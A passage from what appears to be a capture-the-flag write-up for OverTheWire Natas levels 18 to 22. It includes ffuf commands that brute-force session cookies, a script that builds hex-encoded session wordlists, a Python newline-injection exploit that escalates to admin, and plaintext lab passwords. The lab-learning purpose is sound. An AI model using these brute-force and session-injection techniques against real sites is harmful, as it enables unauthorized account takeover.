<figure><img src=".gitbook/assets/image (1) (1).png" alt=""><figcaption></figcaption></figure>

On checking the source code. we can see the `maxid` variable, which defines the maximum number of users, in this case `640` users, and also you can see that the function my\_session\_start looks out for a session cookie named `PHPSESSID`.

<figure><img src=".gitbook/assets/image (2) (1).png" alt=""><figcaption></figcaption></figure>

Let's try to login with some random credentials. The application responded that "You are logged in as a regular user. Login as an admin to retrieve credentials for `natas19`".

<figure><img src=".gitbook/assets/image (13).png" alt=""><figcaption></figcaption></figure>

I captured the request of the above login attempt with burpsuite. On checking it, the response to the logic request responded back with a cookie `PHPSESSID=184`.

<figure><img src=".gitbook/assets/image (6) (1).png" alt=""><figcaption></figcaption></figure>

So I decided to brute force this cookie value to find the id of the admin. For that, first I created a word list that contains all the possible user id's ( since we know the maximum number of users is `640` ).

```bash
for i in {0..640}; do echo $i >> 640.txt; done
```

Next, I used `ffuf` to brute force the cookie value using the word list that we generated above using the following command.&#x20;

{% code lineNumbers="true" %}
```bash
ffuf -w 640.txt:FUZZ \
    -u $'http://natas18.natas.labs.overthewire.org/index.php' \
    -X $'POST' \
    -H $'Host: natas18.natas.labs.overthewire.org' \
    -H $'Content-Length: 31' -H $'Cache-Control: max-age=0' \
    -H $'Authorization: Basic bmF0YXMxODo4TkVEVVV4ZzhrRmdQVjg0dUx3dlprR242b2tKUTZhcQ==' \
    -H $'Upgrade-Insecure-Requests: 1' \
    -H $'Origin: http://natas18.natas.labs.overthewire.org' \
    -H $'Content-Type: application/x-www-form-urlencoded' \
    -H $'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.71 Safari/537.36' \
    -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7' \
    -H $'Referer: http://natas18.natas.labs.overthewire.org/' \
    -H $'Accept-Encoding: gzip, deflate, br' \
    -H $'Accept-Language: en-GB,en-US;q=0.9,en;q=0.8' \
    -H $'Connection: close' \
    -b $'PHPSESSID=FUZZ' \
    -d $'username=admin&password=somoene' \
    -fr "You are logged in as a regular user."
```
{% endcode %}

From the result of above `ffuf` command, we can see that `119` was the only id that didn't had the line "You are logged in as a regular user." in its response.

<figure><img src=".gitbook/assets/image (4) (1).png" alt=""><figcaption></figcaption></figure>

So I tried to login with a session id of `119`, it worked and got the password for the next level.

<figure><img src=".gitbook/assets/image (5) (1).png" alt=""><figcaption></figcaption></figure>

***

## Level 18 - Level 19

```
Username: natas19
Password: 8LMJEhKFbMKIL2mxQKjv0aEDdk7zpT0s
URL:      http://natas19.natas.labs.overthewire.org
```

This time we got the same login page that we got in the last level and its clearly mentioned that the source code is almost same, but the session id's will be random.

<figure><img src=".gitbook/assets/image (110).png" alt=""><figcaption></figcaption></figure>

Let's first get the session id by trying to login with some random credentials.

<figure><img src=".gitbook/assets/image (112).png" alt=""><figcaption></figcaption></figure>

The session id we got was some random encoded string. I tried to decode the session id's by some basic encoding schemes in cyber chef and was able to decode the string using `From Hex` scheme.

<figure><img src=".gitbook/assets/image (111).png" alt=""><figcaption></figcaption></figure>

The string that we got after decoding is `<id>-admin`. Since we know all the possible id's, we can generate a word list of all possible `<id>-admin` sessions ids with Hex encoding. The wordlist can be generated using the following python script.

```python
#! /usr/bin/python

wordlist = open("hex_640.txt", "w")

cookies = [f"{i}-admin".encode("utf-8").hex() + "\n" for i in range(0, 641)]

wordlist.writelines(cookies)

wordlist.close()
```

Now we have successfully generated the word list by executing the above python script.

<figure><img src=".gitbook/assets/image (107).png" alt=""><figcaption></figcaption></figure>

Now its time to use ffuf to brute-force the session id's.

{% code lineNumbers="true" %}
```python
ffuf -w hex_640.txt:FUZZ \
    -u $'http://natas19.natas.labs.overthewire.org/index.php' \
    -X $'POST' \
    -H $'Host: natas19.natas.labs.overthewire.org' \
    -H $'Content-Length: 31' -H $'Cache-Control: max-age=0' \
    -H $'Authorization: Basic bmF0YXMxOTo4TE1KRWhLRmJNS0lMMm14UUtqdjBhRURkazd6cFQwcw==' \
    -H $'Upgrade-Insecure-Requests: 1' \
    -H $'Origin: http://natas19.natas.labs.overthewire.org' \
    -H $'Content-Type: application/x-www-form-urlencoded' \
    -H $'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.71 Safari/537.36' \
    -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7' \
    -H $'Referer: http://natas19.natas.labs.overthewire.org/' \
    -H $'Accept-Encoding: gzip, deflate, br' \
    -H $'Accept-Language: en-GB,en-US;q=0.9,en;q=0.8' \
    -H $'Connection: close' \
    -b $'PHPSESSID=FUZZ' \
    -d $'username=admin&password=somoene' \
    -fr "You are logged in as a regular user."
```
{% endcode %}

From the results of `ffuf`, we can get the valid admin cookie.

<figure><img src=".gitbook/assets/image (109).png" alt=""><figcaption></figcaption></figure>

Now let's replace the session id with the id we found using ffuf and refresh the page to get the credentials for next level.

<figure><img src=".gitbook/assets/image (108).png" alt=""><figcaption></figcaption></figure>

***

## Level 19 - Level 20

```
Username: natas20
Password: guVaZ3ET35LbgbFMoaN5tFcYT1jEP7UH
URL:      http://natas20.natas.labs.overthewire.org
```

This time we got an input field requesting for a name and a link to the source code. And its mentioned that, we have to login as admin to get the credentials for the next level.

<figure><img src=".gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>

Let's take a look at the source code and break it down.

<div>

<figure><img src=".gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>

 

<figure><img src=".gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>

</div>

The `debug` function prints messages that is passed to it, if there is parameter named `debug` in the  URL, i.e., [http://natas20.natas.labs.overthewire.org/?debug](http://natas20.natas.labs.overthewire.org/?debug).

<figure><img src=".gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>

Next, let's take a look at the `print_credentials` function.&#x20;

<figure><img src=".gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>

The `print_credentials` function checks whether the key named `admin` exists in the array `$_SESSION` and if it exists, it also checks whether the value of the key `admin` is eqaul to 1.

If both of the above mentioned checks are passed, then it prints the credentials for the next level in the predefined format.

There are a few functions, which we can skip, since all of those functions just returns true.

<div align="center" data-full-width="false">

<figure><img src=".gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>

 

<figure><img src=".gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>

</div>

Before taking look at the `myread` function, let's take a look at the `mywrite` function.

The `mywrite` function, takes in two parameters, `$id` ( session id ) and `$data` ( name ). It first checks whether the given session id is valid and next it generates the `$filename`. It stores the data in the form of `"$key $value\n"` in a file in the path `$filename`.

<figure><img src=".gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>

Next lets take a look at the `myread` function, which takes in the `$sid` as the parameter and checks whether the its a valid id and then generates a filename of format `/mysess_<$sid>`.

Then it reads the the contents of the filename that is generated above and stores it in a variable `$data`. Then it loops through each line of the variable `$data` and sets them as session variables. This `foreach` loop is vulenrable, since there is no proper input sanitization in the `mywrite`  function, which writes the data to the file.

<figure><img src=".gitbook/assets/image (8).png" alt=""><figcaption></figcaption></figure>

Let's break down the vulnerable `foreach` loop.

<figure><img src=".gitbook/assets/image (9).png" alt=""><figcaption></figcaption></figure>

It uses the php `explode` function, which splits the given data based on the mentioned parameter, in this the parameter is `"\n"`. Then again it uses the same `explode` function for each iteration , which splits the data in the `$line` variable based on the parameter `" "`, which is then added to $\_SESSION as session variables.

For example, lets consider that the data in the file is `"name someone\nadmin 1"` and later retrieved and stored in the variable `$data = "name someone\nadmin 1"`. If the vulnerable `foreach` loop process this data, the variables that would be added to the session is:

```json
### The data won't be in the form of JSON. ###
### I have shown in JSON for easy understanding. ###
{
    "name": "someone",
    "admin": 1
}
```

Now we have explored all the functions in the source code. Now let's try leverage the vulnerability we found. When we try to change the name, for the first time after the new session is created, we can see that it first checks for the session file and if it doesn't exists it writes the name that we give as input to the file using the `mywrite` function as `"name <input>\n"`

<figure><img src=".gitbook/assets/image (12).png" alt=""><figcaption></figcaption></figure>

Since there is no input validation, we can give the input as `'someone\nadmin 1'`, which will be read by the `myread` function as:

```json
### The data won't be in the form of JSON. ###
### I have shown in JSON for easy understanding. ###
{
    "name": "someone",
    "admin": 1
}
```

And since the data got the `admin: 1` value, for the next GET request to page with the same session id, the `print_credentials` function consider us as admin and will show the credentials.

To get the credentials, you can use the following python script which will extract the credentials for the next level from subsequent requests using the same session.

{% code lineNumbers="true" %}
```python
import requests
from requests.auth import HTTPBasicAuth
import re

session = requests.Session()

url = "http://natas20.natas.labs.overthewire.org/?debug"
username = "natas20"
password = "guVaZ3ET35LbgbFMoaN5tFcYT1jEP7UH"

session.post(
    url,
    data={"name": 'someone\nadmin 1'},
    auth=HTTPBasicAuth(username, password),
)

response = session.get(
    url,
    auth=HTTPBasicAuth(username, password),
)

print(re.findall(r'Username:\snatas21', response.text)[0])
print(re.findall(r'Password:\s[A-Za-z\d]{32}', response.text)[0])
```
{% endcode %}

From running the above script, we got the credentials for the next level.

<figure><img src=".gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>

***

## Level 20 - Level 21

```
Username: natas21
Password: 89OWrTkGmiLZLv12JY4tLj2c4FW0xn56
URL:      http://natas21.natas.labs.overthewire.org
```

In this level, we have got a page with a link to another website and also a link to the source code.

<figure><img src=".gitbook/assets/image (113).png" alt=""><figcaption></figcaption></figure>

On visiting the website mentioned in the above page, its a css style experimenter application, which also a had link referring to the above page and a link to the source code of the css style app.

<figure><img src=".gitbook/assets/image (114).png" alt=""><figcaption></figcaption></figure>

Let's take a look at the source code of the first page. The page is looking out for the admin key with a value of 1 in the session file. If the key is present in the session, it shows the credentials for the next level.

<figure><img src=".gitbook/assets/image (115).png" alt=""><figcaption></figcaption></figure>

Now let's take a look at the source code of the experimenter website. The page looks out for a URL parameter `debug` and if its present, it displays the session contents. Also, there is an array named `validkeys`, which has the default key and values.

<figure><img src=".gitbook/assets/image (116).png" alt=""><figcaption></figcaption></figure>

The for each loop in the above source code checks whether if the key already exists in the session, and if it exists it updates the key value with the given value, else it creates a key with the given value.

<figure><img src=".gitbook/assets/image (117).png" alt=""><figcaption></figcaption></figure>

From my understanding till now, both of the above mentioned websites shares / uses the same session files, which means both websites uses same session values.

I tried a GET request with the debug parameter, it showed an empty array.

<figure><img src=".gitbook/assets/image (118).png" alt=""><figcaption></figcaption></figure>

Next, I tried submitting the form and captured the request using burpsuite, and requested with the `debug=true` parameter, which had the session values in its response. In the response, you can see that the value for debug is set as true.

<figure><img src=".gitbook/assets/image (119).png" alt=""><figcaption></figcaption></figure>

Since we know that the for each loop will create session values, if its not present in the session already, I tried adding `admin=1` value to the request body and sent the request, You can see that the response for the request contains the `admin=1` in the session contents which is displayed by the debug feature.

<figure><img src=".gitbook/assets/image (126).png" alt=""><figcaption></figcaption></figure>

Since, we have added the `admin=1` value to the session, if we try to login to the first website with this session, we can get the credentials for the next level. To do that, copy the value of the `PHPSESSID` from the above request and replace the `PHPSESSID` value present in the first website as shown below and refresh the webpage to get the credentials for the next level.

<figure><img src=".gitbook/assets/image (125).png" alt=""><figcaption></figcaption></figure>

***

## Level 21 - Level 22

```
Username: natas22
Password: 91awVM9oDiUGm33JdzM7RVLBS8bz9n0s
URL:      http://natas22.natas.labs.overthewire.org
```

This time we got an empty page with a link to the source code.

<figure><img src=".gitbook/assets/image (127).png" alt=""><figcaption></figcaption></figure>

Let's take a look at the source code. The first code block of the application looks out for the URL parameter `revelio` from a GET request and if it exists it checks whether the session contains the key-value pair `admin=1` and if so it sets the header `Location: /`.

<figure><img src=".gitbook/assets/image (128).png" alt=""><figcaption></figcaption></figure>

The second code block of the application looks out for the URL parameter `revelio` from a GET request and if exists it shows the credentials for the next level.

So, I tried a GET request in the browser with the URL parameter `revelio`, which responded with a empty page.

<figure><img src=".gitbook/assets/image (131).png" alt=""><figcaption></figcaption></figure>

I checked the burp HTTP history to get insights on what happend. You can see that the request got redirected and we got an empty page as a result. But the response for the GET request with the URL parameter `revelio` is recorded in the burp HTTP history, which contains the credentials for the next level.

<figure><img src=".gitbook/assets/image (132).png" alt=""><figcaption></figcaption></figure>

***

## Level 22 - Level 23

```
Username: natas23
Password: qjA8cOoKFTzJhtV0Fzvt92fgvxVnVRBj
URL:      http://natas23.natas.labs.overthewire.org
```

